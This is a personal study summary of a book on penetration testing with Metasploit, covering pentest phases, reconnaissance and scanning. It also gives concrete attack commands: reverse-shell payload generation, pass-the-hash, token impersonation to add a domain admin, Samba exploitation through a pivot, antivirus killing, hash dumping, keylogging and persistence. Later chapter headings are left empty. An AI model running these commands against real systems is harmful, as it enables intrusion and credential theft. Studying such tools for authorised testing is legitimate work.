---
title: "Hacking and pentesting with Metasploit"
author: "Me"
date: "May 25, 2015"
output: html_document
---

# Hacking and pentesting with Metasploit
{:.no_toc}

This is a resumee of the book “Hacking, security and penetration testing with Metasploit”. The book contains many explanations and demos for specific tools; these will not be resumed here. Instead, I will focus on concepts and theory.

The chapters are the following:

1. TOC
{:toc}
{:style="color:black; font-size: 150%;"}

# Pentesting basics

## The 7 PTES (Penetration Testing Execution Standard) phases
{:style="color:DarkRed; font-size: 170%;"}

1. **Pre-Engagement Actions**\\
Discussion of the test’s scope with the client (what can we do, what methods we can use, which networks and addresses are in range, …).  
It is important to have a precise contract defining the scope and the engagements.

2. **Information gathering (Reconnaissance, footprinting)**\\
The idea of this phase is to gather as much information about the target as possible. We want to know how the target works and how it can be attacked. Commons reconnaissance methods include : Google hacking, domain name searches, WHOIS lookups, reverse DNS, social engineering, social networks footprinting, dumpster diving (various physical methods to get information) and tailgating (closely follow someone who has legitimate access into a secure building).

3. **Threat Modeling**\\
Think like an attacker about the company’s assets and how they could be used. It can be useful to make an organizational structure of the company : who works where, what is their role, can they be used to gain access to something (information gathered in the previous phase) ?
In general, we are interested in employee data, customer data and technical data. There is nothing concrete in this phase, we just elaborate a plan.

4. **Vulnerability identification**\\
Now that we identified the best attack methods, we have to determine how we will access the target. Typically, scanning tools (port scanners, vulnerability scanners) are used in this phase. Here we try to know what systems are up, what OS are they running, if there is a firewall, an antivirus (AV), intrusion detection system (IDS), etc…

5. **Exploitation**\\
An exploit should be made only if we are 100% sure that it will work. Before taking advantage of a vulnerability, we have to know that the system is vulnerable. The goal is to gain access to systems, and gain as high of administrator access as possible.

6. **Post-exploitation**\\
Starts after we have compromised one or more systems. In this phase, we target specific systems, identify critical infrastructures and look for data that the target tried to secure. To what point can we jeopardize a system, and what would the repercussions be ?
We really have to think like a pirate in this phase.

7. **Report**\\
The report is the most important part of a pentest. It contains what we did, how we did it, and most importantly, what could the organization do to correct the vulnerabilities we found and used. The purpose is that the client enhances the global security, not that he just patch the vulnerabilities we found.
The report should contain an abstract, a presentation and a technical part.


## Penetration test types
{:style="color:DarkRed; font-size: 170%;"}

1. **White box (white hat)**\\
It is a visible test : we work with the client.
Pros : the client’s security team can show us the systems and everything we might want to know.
Cons : might be biased.
A white box test can be good when we have a limited time and can’t do a proper information gathering phase.

2. **Black box**\\
It is an invisible test, performed without the knowledge of the organization.
Pros : much more realistic than a white box test.
Cons : lasts way longer than a white box test and require more skills.
If possible, this should be the prefered over a white box test.


# Metasploit basics : introduction to the tools of Metasploit

## Terminology
{:style="color:DarkRed; font-size: 170%;"}

<ins>**Exploit**</ins>\\
An exploit is the mean by which an attacker take advantage of a vulnerability in a system, an application or a service. **buffer overflows** and **SQL injections** are examples of exploits.

<ins>**Payload**</ins>\\
A payload is a piece of code that we want to be executed by the tarhet system. For example, a **reverse shell** is a payload that creates a connection from the target to the attacker, whereas a **bind shell** is a payload that binds a listener on a port of the target machine so that the attacker can connect to it.

<ins>**Shellcode**</ins>\\
A shellcode is a set of instructions used by a payload during an exploit. It is typically written in **assembly**. In most cases, a **shell** or a **meterpreter shell** is used after a set of instructions has been executed by the machine.

<ins>**Module**</ins>\\
A module is a part of a software that can be used by the Metasploit framework. It is sometimes necessary to use an **exploit module** that carries the attack, or an **auxiliary module** to scan or enumerate systems.

<ins>**Listener**</ins>\\
A listener is a procedure or function that awaits any entering connection. For example, once that target has been exploited, it can communicate with the attacker via internet. The listener handles this connection.

## The interfaces of Metasploit
{:style="color:DarkRed; font-size: 170%;"}

There are 3 interfaces: **Msfconsole**, a **CLI** (command line interface) and a **GUI** (graphical user interface, Armitage), and different utilities. We will be using msfconsole only. The utilities are *direct interfaces* that can be useful for exploit development and are the following:

<ins>**MSFpayload**</ins>\\
Msfpayload is used to generate a shellcode, executables and more. Shellcode can be written in many languages (C, Ruby, JavaScript, ...). Each format is useful in different situations; for example if we want to create an exploit for a browser, JavaScript would be a good choice. The payload can then simply be inserted into an HTML file. To see the options used by the utility, we can use the command *msfpayload -h*.

<ins>**MSFencode**</ins>\\
The shellcode generated by MSFpayload works, but it contains null characters which, when interpreted by some programs, mean the end of a string. In other words, the code would stop before it reaches the end because of some *x00s* and *xffs*.

In addition to that, it's risky to send a shellcode in plaintext on a network; it could be easily detected by IDS (intrusion detection system) and AV (antivirus). 

Msfencode is used to encode the payload in a way that avoids those undesired characters. We can see the list of options with the command *msfencode -h*. There are different encoders, useful for different situations. One of the best encoder is **x86/shikata_ga_nai** (*msfencode -l* shows a list of available encoders).


<ins>**Nasm Shell**</ins>\\
Useful to analyze assembly code, especially if we want to identify **opcodes** of an assembly instruction. For example, we can start the tool with *./nasm_shell.rb* and then ask for the code of *jmp esp*; it would return 00000000 FFE4.

# Information gathering : how to use Metasploit to gather intelligence in the early stages of a pentest

Information gathering is the second phase of the PTES and maybe the most important. It is the basis of all the work that will come after it.

## Passive information gathering
{:style="color:DarkRed; font-size: 170%;"}

We collect information without touching the target systems. We can identidy the architecture, the network admins, what OS is used and what web server is used on the target network. **OSINT** (Open Source Intelligence) is a form of information gathering during which we use free free or easily obtainable information to chose and acquire information on the target.

A few examples are **whois** lookups (for example, *whois google.com* in a terminal gives a lot of information), **Netcraft** (a web tool to find the IP of a server hosting a website) and  **NSLookup** (gives more information on the server.)\\
Passive information gathering is useful to define what systems should be included in the pentest (in a legal point of view).

## Active information gathering
{:style="color:DarkRed; font-size: 170%;"}

In active information gathering, we interact directly with a system to learn more about it. **Port scanning** is an example of active information gathering. **Nmap** is one of the most popular port scanner.

In a complex pentest, where there are multiple targets to scan, it is very important to keep a trace of what we do. Fortunately, Metasploit has its own databases (MySQL and PostgreSQL), PostgreSQL being used by default.

**Pivoting** is the process by which we can access and attack systems that would be out of reach by using interconnected systems to route traffic.\\
Example: let's suppose we compromised a system behind a Firewall using NAT (Network Address Translation). This system uses private IP addresses that we can't access from the internet. We can use this compromised system to avoid the firewall and access the internal network of the target.


## Targeted scans
{:style="color:DarkRed; font-size: 170%;"}

It is sometimes useful to perform **targeted scans** to find specific services and/or versions that we know are vulnerable. Some examples are:

- Scan a target network to find the vulnerability **ms08-067**, because it is a very common vulnerability that gives access to SYSTEM.
- Detect the versions of Microsoft Windows with the module **smb_version** (*use scanner/smb/smb_version*). In the options, we can chose the number of threads; 1 (default) is enough if we scan a single system, but we could use more if we scan a subnet for example.
- Look for misconfigured Microsoft SQL servers (**MS SQL**), known to be an easy entry door in a network. This is due to the fact that many system admins don't even know that their machines use MS SQL, because it is preinstalled on the system. It is often misconfigured or outdated.\\
When installed, MS SQL listens on the TCP port 1433 by default (see the module *mssql_ping*). 
- Scan of **SSH** (Secure Shell) servers. If we find any, we have to determine its version. Many vulnerabilities have been identified in its implementations, and we could be lucky and find an old machine that hasn't been updated. To determine the version, we can use the modulee *ssh_version**. 
- Scan of **FTP** (File Transfer Protocol). FTP is a complicated and vulnerable protocol. FTP servers are often the easiest way in a target network. We can use the module *ftp_version*. If there is a FTP server, we can see if it allows anonymous connection with scanner *anonymous* (*use auxiliary/scanner/ftp/anonymous*). 
- **SNMP** (Simple Network Management Protocol) scan. Usually, this protocol is used by network devices. However, some OS have SNMP servers that provide information about the CPU usage, available memory and other details of the system. If there is such a server, it's a gold mine for a pentester because it gives a ton of information. We can use the auxiliary module *snmp_enum* for SNMP enumerations.

# Vulnerability scanning : how to identify vulnerabilities and scanning techniques

Finding vulnerabilities automatically can be done with the help of a **vulnerability scanner**. It basically sends data on a network and analyze the answers to enumerate vulnerabilities, using a vulnerability database. OS answer differently based on their network layers implementations, and those unique answers are used by the scanner to determine the OS version and its patch version. It can also connect to the target system and enumetate softwares and services to see if they are patched.

Vulnerability scanners are very noisy on a network. They should not be used if we want to be unnoticed, but can save valuable time if it doesn't matter.

## Base vulnerability scan
{:style="color:DarkRed; font-size: 170%;"}

We can use **netcat** to perform a **banner grabbing** on the target. The command would be *nc 192.168.1.293 80*: here we connect to 192.168.1.293 on a web server (port 80), and we can then use the command *GET HTTP* to receive headers information returned by the server. Imagine we receive the information *Server: Microsoft-IIS/5.1*: we could then use a vulnerability scanner to determine if this ISS version has known vulnerabilities and if the server is up to date.\\
It can be harder in reality, because there are false positives and false negatives.

**NeXpose** and **Nessus** are examples of vulnerability scanners (see the book for more details on their use). NeXpose can either be used from a web interface or directly in Metasploit with the plugin NeXpose. Nessus can also be used in Metasploit with the plugin Nessus, or in a web interface.


## Specialized vulnerability scan
{:style="color:DarkRed; font-size: 170%;"}

Sometimes we want to perform a specific analysis for a vulnerarbility on the network: Metasploit has many auxiliary modules for that. Some examples are:

- Validate **SMB** (Server Message Block) connections: we can use the *SMB Login Check Scanner* to verify the validity of a username/password (brute-forcing it). This scan is very noisy and every attempt will be logged. We start the module with the command *use auxiliary/scanner/smb/smb_login*. We then set the required parameters and can launch the exploit.
- Open **VNC** (Virtual Network Computing) access research: VNC offers a GUI to remote systems. VNC is common in companies because it gives a graphical view of a server and machines. Then, it is often forgotten and out of date, creating an important  vulnerability. The VNC module *Authentication None* searches in a range of IP addresses VNC servers that don't have any configured password (they accept *None* authentication, i.e an empty password). This analysis is generally not very useful, but every lead can be worth it (recent VNC servers don't allow empy passwords). We start the module with *use auxiliary/scanner/vnc/vnc_none_auth*. If we find a server that doesn't require a password, we can use *vncviewer* to connect to it.
- Scan to find open **X11** servers: the scanner looks for X11 severs that allow authentication witout a password. These servers are not common nowadays, but can be found on old systems. We start the module with *use auxiliary/scanner/x11/open_x11*. If we find any, we can for example use a keylogger such as **XSpy**. A user could connect with SSH, we capture the password and have then root access on the system.

## Using scan results for Autopwning
{:style="color:DarkRed; font-size: 170%;"}

The tool **Autopwn** from Metasploit automatically targets and exploit a system using an open port or the results of a vulnerability scan. We can use it to exploit the results of a Nessus or NeXpose scan, for example.

# Exploitation : introduction to exploitation

Systems and networks are generally becoming better protected, and basic exploits are less likely to work. This chapter focuses on more complicated attacks and exploits customization with **msfconsole**, **msfencode** and **msfpayload**.

## Base exploitation
{:style="color:DarkRed; font-size: 170%;"}

- **Msf> show exploits**: this commands shows all the exploits available in Metasploit.
- **Msf> show auxiliary**: auxiliary modules can serve different purposes. They can be used as scanners, DoS modules, fuzzers (fuzzing is a technique to test programs: the idea is to inject random data into a program until it fails. It is useed to find vulnerabilities) and more. The command shows the auxiliary modules and their characteristics.
- **Msf> search**: this command is useful to find a specific attack, an auxiliary module or a payload.
- **Msf> use**: is the command to use an exploit or module. For example, *use windows/smb/ms08_067_netapi*.
- **Msf> show options**: when we use this command with a selected module, it shows the options for this specific module. When no module is selected, the command shows global options.
- **Msf> set and unset**: some parameters shown by the previous command (*show options*) are required. We can use the command *set* to set an option, and *unset* to unset it.
- **Msf> setg and unsetg**: these commands are used to set/unset a global parameter in msfconsole. It is useful for variables that don't often change, like our IP address for example (LHOST). After setting general options with *setg*, we can use the command **save** to save them for the next time we use msfconsole. This can be done anytime and anywhere in msfconsole (within or outside of a module), and the configuration is saved in *root/.msf3/config*.
- **Msf> show payloads**: we saw that payloads are pieces of code sent to the target. As for *show options*, when we use this command within a module, it shows the available payloads for that module. For Microsoft Windows exploits, a payload can be as simple as a command prompt on the target, and as complex as a complete GUI on the target system. After selecting a payload (with *set*), we can use the command *show options* again to see the new parameters. In reverse payloads, the connection is done by the target machine to the attacker; we must specify our IP and a port to which it will connect. We can use this technique to bypass a NAT or a firewall.
- **Msf> show targets**: modules often list potentially vulnerable targets, based on their version, language and security implementations. It is generally a good idea to identify the right exploit instead of using the option *Automatic targetting*. Therefore, it is important to identify the OS of the target; if the exploits uses an overflow against the wrong OS, it can do severe damage.
- **Msf> info**: called from within a module, this command gives additional on this latter. We can also use this command outside of a module, followed by the name of a module.


## Port bruteforcing
{:style="color:DarkRed; font-size: 170%;"}

Until now, we assumed that the reverse port was always opened. However, most companies block outgoing connections, except on a few specific ports. It can be hard to determine the ports that allow an outgoing connection.

We can easily guess that port 443 (HTTPS) will not be inspected and allows an outgoing TCP connection. We can also suppose that ports 23 (Telnet), 21 (FTP), 22 (SSH) and 80 (HTTP) are authorized. 

However, Metasploit has a payload defined to look for open ports. This latter will try all the available ports until it finds an open process. It is the payload *windows/meterpreter/reverse_tcp_allports* (we can find it with the command *search ports*). We launch the exploit without specifying LPORT; it will automatically open a meterpreter session on an outgoing port.

## Resource files
{:style="color:DarkRed; font-size: 170%;"}

Resource files are script files that allow to automate commands in msfconsole. They contain a list of commands that are executed sequentially by msfconsole.

These files can be loaded into msfconsole with the command *resource*. For example, we can use a SMB exploit in a new resource file called *autoexploit.rc*: We define a payload, the attack and the target's IP in this file (so we don't have to do it manually when we try the exploit). We would:

~~~~
echo use exploit/windows/smb/ms08_067_netapi > autoexploit.rc
echo set RHOST *target IP* >> autoexploit.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >> autoexploit.rc
echo set LHOST *my IP* >> autoexploit.rc
echo exploit >> autoexploit.rc
~~~~~

We would then start Metasploit with *msfconsole* and launch the exploit with *resource autoexploit.rc*.

# Meterpreter : presentation of the post exploitation swiss knife

Meterpreter is the "swiss knife" of post-exploitation. It is one of the most popular tool of Metasploit, used as a payload after the exploitation of a vulnerability. A payload represents the information sent back to us when we trigger an exploit.\\
For example, when we exploit a vulnerability in a RPC (Remote Process Call), launch it with Meterpreter as payload, it will give us a meterpreter shell on the system. Meterpreter is an extension of the Metasploit framework that allows to go deeper, for example by covering our tracks, dump hashes, pivot, and more.\\
In this chapter, the payload Meterpreter is used to perform additional attacks once the system has been compromised. 

## Compromise a Windows XP machine
{:style="color:DarkRed; font-size: 170%;"}

In the book, they start by compromising a Windows XP machine to get a meterpreter shell. The resumed steps are the following:

- They use nmap to scan ports, see a MS SQL server.
- They attack it by bruteforcing the SA (system administrator) account (with the scanner *mssql_ping*).
- They bruteforce the server (password) with the scanner *mssql_login*.
- Once connected, they use *xp_cmdshell* (a  default procedure in SQL Server), allowing them to communicate with the underlying OS and execute commands. It's like a sudo user prompt. MS SQL Server is usually executing with SYSTEM level authorizations, so they have an admin access on the server as well as on the machine itself). 
- Then, they interact with xp_cmdshell to throw a payload on the system; they add a local admin and give the payload via an executable. To do this, they use the module *mssql_payload*: *use windows/mssql/mssql_payload*.
- They set the payload as *set PAYLOAD windows/meterpreter/reverse_tcp* (meterpreter), LHOST, LPORT, RHOST and the password found previously. Finally, the launch the exploit and get a meterpreter shell.

Great, the exploit worked and we got a meterpreter shell. We can continue the exploitation on this system. The command *help* gives informatin about the use of meterpreter.

<ins>**Meterpreter base commands**</ins>

- **screenshot**: exports an image of the user desktop. A screenshot can provide information on antivirus for example.
- **sysinfo**: reveals the OS of the system.
- **ps**: lists the active processes on the system. Imagine we see a explorer.exe process with the PID 1668. We can migrate our session into it with the command **migrate** (*migrate 1668*), and then record keystrokes with **run post/windows/capture/keylog_recorder**. We can stop the keylogger with ctrl+c and see what it recorded.

## Usernames and passwords retrieval
{:style="color:DarkRed; font-size: 170%;"}

Previously, we retrieved hashed usernames and passwords with a keylogger. Fortunately, it is not the only way to do it; we can also use meterpreter to retrieve usernames and hashed passwords in local files.

<ins>**Retrieve hashed passwords**</ins>\\
We use the postexploitation module *hashdump* of meterpreter to extract usernames and passwords out of the system. Microsoft usually stocks hashes for LAN Manager (LM), NT LAN Manager (NTLM) and NT LAN Manager v2 (NTLMv2).\\ 
In LM, passwords are divided into 7 characters and hashed. For example, *password123456* would be divided into *passwor* and *d123456*. LM is easy to crack because even for our 14 characters long password, we in fact only have to crack two 7 characters long passwords.\\
In NTLM, the password isn't divided and would be hashed as a single value.

If a password is longer than the 14 characters supported by LM, it is automatically converted into a NTLM hash.

Imagine we extract a username for the admin user (by default UID 500 on Windows) and a hashed password. It is written as follows:

*Administrator:500:e52cac67419a9a22cbb699e2fdfcc59e:30ef086423f916deec378aac42c4ef0c:::*

The first hash (starting with e52 and finishing with 59e) is a LM hash, and the second (starting with 30e and finishing with f0c) is a NTLM hash. The "syntax" is *username:UID:lmhash:ntlmhash*.

<ins>**Discover the password of a hash**</ins>\\
To retrieve the database of the **SAM** (Security Account Manager), we have to get the SYSTEM rights. This file contains usernames and passwords for Windows.\\
We use the command **use priv** and execute the command hashdump (*run post/windows/gather/hashdump*).\\
If the password is very long, the hash will be starting with **aad3b435**, which is an empty hash (an other valid syntax is *Administrator:500:NOPASSWD:ntlmhash*). This is because if it is longer than 14 characters, Windows cannot stock it as a LM hash and signifies it with an empty string.

If we find a LM hash, we can copy it and use an online cracker tool to crack it. If it's a NTLM hash, it's more complicated... The next section will help in this case.

## Pass the hash
{:style="color:DarkRed; font-size: 170%;"}

Sometimes, passwords are complicated and impossible to crack. Nevertheless, we need it to connect to other machines and compromise other systems with that user account...

Fortunately, if we only have a hash (and no plaintext password), we can use the technique **pass the hash**. Example:

~~~~
use windows/smb/psexec
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST *my IP*
set LPORT 443
set RHOST *target IP*
set SMBPass *hashed password*
exploit
~~~~~~

Where the hashed password would be something like *aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29* (we see that the LM hash is an empty string). This exploit would give us a meterpreter session, so we get admin privileges with a simple hash. It is not rare that other systems on the network have the same admin account, so we could jump from a system to another without ever having to break the password.

## Privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

If we compromise a user account which has limited access, we can't execute commands that require an admin access. We can bypass this restriction with **privilege escalation**.

In the book, they create a normal user account (called bob) on a Windows XP machine to demonstrate privilege escalation.\\
First, we create the new user account with the command *net user bob password123 /add.*.\\
Then, we create a meterpreter payload (*payload.exe*) which we copy in the target XP machine and execute as the user bob.\\
We will use msfpayload to create a meterpreter payload from an executable Windows.

The steps are the following:

~~~~
msfpayload windows/meterpreter/reverse_tcp LHOST=*my IP* LPORT=443 X > payload.exe
msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp
LHOST=*my IP* LPORT=443 E
~~~~~

This gives us a meterpreter session. We called the interface msfcli to start a listener handler. This handler will wait for connections, and when it receives one, it will spawn a meterpreter shell.
When the target executes the payload (*payload.exe*), it will spawn a meterpreter will limited permissions (that we can see with the command *getuid*). Once we get the meterpreter session, we can invoke a shell with the command *shell*. Then, we type *net user bob*: we see he is a member of the group users, that he is not an admin and has limited permissions. We can't execute a hash dump of the SAM database to extract usernames and passwords. We can press *CTRL + Z* to save our session and stay in the exploited system. We can then use *background* to come back in msfconsole and quit the current session. Then, we can use *sessions -l* and *sessions -i sessionid* to come back to meterpreter.

We will now obtain admin permissions or SYSTEM:

~~~~
use priv
getsystem
getuid
~~~~~

We first call *use priv* to load the *priv* extensions, which give us access to the privileged module.\\
Then, we use the command *getsystem* to elevate our privilege to local systeem or admin.\\
Finally, we use the command *getuid* to check our permissions.\\
We can come back to the normal user bob with the command *rev2self*.


## Token usurpation
{:style="color:DarkRed; font-size: 170%;"}

In token usurpation, we retrieve a **Kerberos token** on the target machine and we use it for authentication (we borrow its creator identity).\\
Let's imagine we compromised a system and opened a meterpreter session. An admin account was connected in the last thirteen hours. When this account connects, a Kerberos token is transmitted to the server (single sign-on or SSO) and is valid for a certain amount of time. We exploit this system via the valid and active Kerberos token, and we get admin permissions with meterpreter without needing the password. We can then compromise a domain admin account.\\
This is one of the easiest way to take over a system.

So, suppose we get a meterpreter session. We use the *ps* command to list active processes, and see a process called *cmd.exe* with the PID 380. We can then use the command **steal_token 380**. We just usurpated the domain admin account and meterpreter is now executing for this user account.

Sometimes, *ps* can't enumerate an active process as a domain admin. In this case, we can use **incognito** to list available tokens on the system. It is generally a good practice to compare the results of *ps* and *incognito*, since they can differ.\\
We load the extension incognito with *use incognito* and list token with *list_tokens -u*.\\ 
We can now usurpate an identity with the command **impersonate_token *DOMAIN\USERNAME***.\\
Then, we can add a user account to which we give domain admin permissions:\\

~~~~
use incognito
list_tokens -u
impersonate DOMAIN\USERNAME
add_user omgcompromised p@55w0rd! -h *Host IP*
add_group_user "Domain Admins" omgcompromised -h *Domain controller IP*
~~~~~

Note that in reality, we would have to use 2 "\" between DOMAIN and USERNAME.

## Pivoting to other systems
{:style="color:DarkRed; font-size: 170%;"}

**Pivot** is a meterpreter method which allows to attack other systems on a network via the console.\\
In the following example, we will attack a system in a network and then route our traffic via this system to attack another system. We will start by exploiting a Windows XP machine, and then propagate the attack to a Ubuntu machine on the internal network. We will connect to the address 10.10.1.1/24 and attack systems within the network 192.168.33.1/24.

Let's suppose we already have access to a server. We will focus on the establsihment of a connection to this server, and then on the insertion of external scipts written with meterpreter which can be found in the directory *scrripts/meterpreter*.\\
We start by looking at local subnets on the compromised system with the command *get_local_subnets*. When then set aside our active session with *background*, and add a route command to the framework, asking to route the remote network ID to session 1 (the meterpreter session in the background). Finally, we display active routes with *route prrint*:

~~~~
run get_local_subnets
background
route add 192.168.33.0 255.255.255.0 1
route print
~~~~~

Note that instead of *route add*, we could automatically add routes with the command *load auto_add_route*.
Now, we will set a second exploit against the target system Linux. The specific exploit here is a **heap overflow** based on Samba:

~~~~
use linux/samba/lsa_transnames_heap
set payload linux/x86/shell/reverse_tcp
set LHOST 10.10.1.129
set LPORT 8080
set RHOST 192.168.33.132
ifconfig
exploit
~~~~~~

This should give us a reverse shell from 192.168.33.132. We can now scan ports through the pivot with the module *scanner/portscan/tcp*.

## Use meterpreter scripts
{:style="color:DarkRed; font-size: 170%;"}

Many external meterpreter scripts can help enumerate a system or execute predefined tasks in a meterpreter shell. In the book, it is said that scripts are being modified into postexploitation modules; I will still resume them here. We can execute a script in the console with the command *run scriptname*. For example, we can install a VNC session on the target and display its desktop with *run vnc* and then *run screen_unlock*. Here is a list of some of the best ones:

<ins>**Migration of a process**</ins>\\
Often, when we attack a system and exploit a service like Internet Explorer, our meterpreter session is closed when the user closes the browser; we lose our connection to the target. We can avoid this problem with the postexploitation module *migrate*. This latter migrates the service to a memory location which is not closed when the user closes the browser. The command is the following:

~~~~~
run post/windows/manage/migrate
~~~~~~~

<ins>**Kill an antivirus**</ins>\\
Obviously, an AV can prevent certain actions. We can kill it with the script *killav*:

~~~~~
run killav
~~~~~~~

<ins>**Obtain password hashes of the system**</ins>\\
A copy of the hash allows us to execute the *pass-the-hash* attack or bute-force the passwords. As we saw it previously, we can get hashed passwords with the command *hashdump*:

~~~~~
run hashdump
~~~~~~~

<ins>**Spy the traffic on the target**</ins>\\
To see the traffic on the target, we use a packet sniffer. Everything recorded by *packetrecorder* is saved in a file with the *.pcap* format. We can then analyze it with a tool like **Wireshark**.\\
In the following command, we specify the interface on which to listen (1 here) with the flag *-i*:

~~~~~
run packetrecorder -i 1
~~~~~~~

<ins>**Scraping of a system**</ins>\\
The script *scraper* enumerates everything we would lik to know on a system: it retrieves usernames and passwords, download the register, retrieve password hashes, get information on the system and export the *HKEY_CURRENT_USER* (HKCU).

~~~~~
run scraper
~~~~~~~

<ins>**Use persistence**</ins>\\
The script *persistence* allows to inject a meterpreter agent to make sure that meterpreter will be available, even if the target system is restarted.\\
In the case of a **reverse connection**, we can define the time at which the target will try to connect to the attacker machine.\\
In the case of a **bind**, we can connect to the interface anytime.\\
It is important to remove it when we're done, otherwise any attacker will be able to connect without authentication.\\
In the following commands, we use the persistence and ask Windows to activate the agent whenever it boots (*-X*), to wait 50 seconds (*-i 50*) before it tries to connect on the port 443 (*-p 443*) at the IP  *192.168.33.129*. We then set a listener  for the agent with the command *use multi/handler* and execute the exploit:

~~~~~
run persistence -X -i 50 -p 443 -r 192.168.33.129
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LPORT 443
set LHOST 192.168.33.129
exploit
~~~~~~~

The only way to remove the agent is to delete the entry in *HKLM\Software\Microsoft\Windows\CurrentVersion\Run* and to delete the VBScript code in *C:\WINDOWS\TEMP*. Make sure to save the register keys and locations (such as *HKLM\Software\Microsoft\Windows\CurrentVersion\Run\xEYnaHedooc*) to delete them manually. We can usually do it via meterpreter.

## Upgrade a command shell to a meterpreter shell
{:style="color:DarkRed; font-size: 170%;"}

One of the newest functionnality of Metasploit is its capacity to upgrade a command shell type payload into a meterpreter payload once the system has been compromised. This is done with the command **sessions -u**. This is useful in the case where we start with a command shell payload and then realize that the exploited system would be perfect for further attacks in the network. Let's look at the following example:

~~~~~
msfconsole
search ms08_067
use windows/smb/ms08_067_netapi
set PAYLOAD windows/shell/reverse_tcp
set TARGET 3
setg LHOST 192.168.33.129
setg LPORT 8080
exploit -z
sessions -u 1
sessions -i 2
~~~~~~~

Note that we used setg for LHOST and LPORT: this is necessary so that *sessions -u 1* upgrades our shell to a meterpreter shell. Also, we used *exploit -z*, so that it doesn't interact with the session once the the target has been exploited.

## Use Windows API with Railgun
{:style="color:DarkRed; font-size: 170%;"}

We can use the Windows API directly from a Metasploit addon called **Railgun**. In the following example, we will pass into an interactive Ruby shell (*irb*) available via meterpreter.\\
The *irb* shell allows us to interact directly with meterpreter with Ruby syntax. Here, we call Railgun and create a pop-up saying "Hello world":

~~~~
irb
client.railgun.user32.MessageBoxA(0, "Hello", "world", "MB_OK")
~~~~~~

On the target Windows XP, we should see a pop-up. We called *user32.dll* and the function *MessageBoxA*.\\
A list of API calls can be found on <http://msdn.microsoft.com/>.

# Avoid detection : ideas behind AVs evasion

Obviously, we don't want to be busted when we break into a system. This is why it is important to make a plan for avoiding AV detection. This chapter focuses on situations in which AVs can be a problem, and how we can avoid it.

Most AVs use signatures to identify malicious code. If a matching signature is found within a program, process, or disk memory, most AVs quarantine the binary file or kill the executing process. If we use a common payload, we can expect it to be detected by the AV.
To avoid AVs, we can create custom payloads that don't contain any known signature. Furthermore, when we use exploits directly against a system, metasploit payloads are conceived to execute in memory and never write data on the disk. So, when we send a payload with an exploit, most AVs do not detect it was executed on the target.

## Creation of autonomous binaries with MSFpayload
{:style="color:DarkRed; font-size: 170%;"}

# Client side attacks exploitation

# Metasploit : auxiliary modules

# Social engineering toolkit (SET)

# FAST-TRACK : an automated pentest infrastructure

# Karmetasploit : how to use it for wireless attacks

# Create your own module : how to build your own module for exploitation

# Create your own exploit : covers fuzzing and exploits for buffer overflows

# Carry exploits on the Metasploit framework

# Meterpreter scripts

# Pentest simulation


